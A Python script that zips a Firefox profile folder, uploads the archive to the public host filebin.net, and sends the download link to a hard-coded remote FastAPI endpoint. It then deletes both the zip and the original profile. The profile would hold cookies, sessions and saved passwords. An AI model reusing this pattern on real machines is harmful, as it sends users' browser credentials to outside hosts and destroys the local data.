import os
import zipfile
import requests
import time

# FastAPI server URL
FASTAPI_SERVER_URL = "https://4fd7ef24-8595-435c-862c-c76faa2281a9.deepnoteproject.com/upload"
# https://4f68e2cf-7140-471d-977f-a86380d0e026.deepnoteproject.com
def get_profile_path(profile_name):
    """Finds the profile folder using the profile name."""
    profiles_dir = os.path.expanduser('~/.mozilla/firefox')
    profile_folders = [f for f in os.listdir(profiles_dir) if f.endswith(profile_name)]
    if profile_folders:
        return os.path.join(profiles_dir, profile_folders[0])
    return None

def zip_folder(folder_path, zip_name):
    """Zips the folder."""
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    zipf.write(file_path, os.path.relpath(file_path, folder_path))
                except FileNotFoundError:
                    print(f"File not found and skipped: {file_path}")
    print(f'Folder zipped successfully as {zip_name}')

def upload_file_to_filebin(file_path):
    """Uploads a file to Filebin.net with unlimited retries until it succeeds."""
    url = 'https://filebin.net/'
    attempt = 0

    while True:  # Infinite loop for retrying
        with open(file_path, 'rb') as file:
            headers = {'filename': os.path.basename(file_path), 'accept': '*/*'}
            files = {'file': file}
            response = requests.post(url, headers=headers, files=files)

            if response.status_code == 201:  # HTTP 201 Created
                data = response.json()
                if "bin" in data and "id" in data["bin"]:
                    filebin_id = data["bin"]["id"]
                    download_link = f"https://filebin.net/{filebin_id}/{os.path.basename(file_path)}"
                    print(f'File uploaded successfully! Download link: {download_link}')
                    return download_link
                else:
                    print('Failed to retrieve Filebin ID.')
            else:
                print(f'Upload attempt {attempt + 1} failed. Retrying in 5 seconds...')

        attempt += 1
        time.sleep(5)

def send_link_to_fastapi(download_link):
    """Sends the download link to the FastAPI server with unlimited retries until it succeeds."""
    attempt = 0

    while True:  # Infinite loop for retrying
        try:
            response = requests.post(FASTAPI_SERVER_URL, json={"link": download_link})
            if response.status_code == 200:
                print(f"Link successfully sent to FastAPI: {download_link}")
                return
            else:
                print(f"Failed to send link (Attempt {attempt + 1}). Retrying in 5 seconds...")
        except requests.RequestException as e:
            print(f"Network error: {e}. Retrying in 5 seconds...")

        attempt += 1
        time.sleep(5)

def delete_folder(folder_path):
    """Deletes the folder and all its contents."""
    if os.path.exists(folder_path):
        try:
            for root, dirs, files in os.walk(folder_path, topdown=False):
                for file in files:
                    os.remove(os.path.join(root, file))
                for dir in dirs:
                    os.rmdir(os.path.join(root, dir))
            os.rmdir(folder_path)
            print(f"Folder '{folder_path}' deleted successfully.")
        except Exception as e:
            print(f"Error deleting folder '{folder_path}': {e}")
    else:
        print(f"Folder '{folder_path}' does not exist.")

if __name__ == '__main__':
    # Read the latest profile name created by the bash script
    with open('current_profile.txt', 'r') as f:
        profile_name = f.read().strip()

    # Find the profile folder
    profile_path = get_profile_path(profile_name)

    if profile_path:
        zip_name = profile_name + '.zip'

        # Zip the profile folder
        zip_folder(profile_path, zip_name)

        # Upload the zip file to Filebin.net (unlimited retries)
        download_link = upload_file_to_filebin(zip_name)

        if download_link:
            # Send the download link to FastAPI (unlimited retries)
            send_link_to_fastapi(download_link)

        # Remove the zip file after uploading
        os.remove(zip_name)
        print(f"Zip file '{zip_name}' deleted successfully.")

        # Delete the original profile folder
        delete_folder(profile_path)
    else:
        print(f"Profile folder for '{profile_name}' not found.")
